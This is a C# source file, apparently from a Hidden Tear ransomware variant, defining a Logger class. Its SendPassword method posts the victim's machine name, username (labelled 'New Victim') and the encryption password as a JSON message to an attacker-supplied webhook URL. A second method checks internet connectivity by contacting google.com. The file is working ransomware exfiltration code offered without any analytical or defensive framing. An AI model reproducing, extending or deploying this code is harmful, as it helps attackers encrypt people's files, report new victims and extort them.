using System;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace hidden_tear.Tools
{
    internal class Logger
    {
        public static async Task SendPassword(string url,string password)
        {
            var payload = new
            {
                username = Environment.MachineName,
                avatar_url = "",
                content = $"New Victim [{Environment.UserName}]",
                embeds = new[]
                {
                    new
                    {
                        title = $"Hidden Tear",
                        description = $"password: {password}",
                        color = 16711680
                    }
                }
            };
            string jsonPayload = JsonSerializer.Serialize(payload);

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                await client.PostAsync(url, content);
            }
        }

        public static bool Internet()
        {
            WebRequest webRequest = WebRequest.Create("https://www.google.com/");
            try
            {
                Console.WriteLine(webRequest.GetResponse());
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
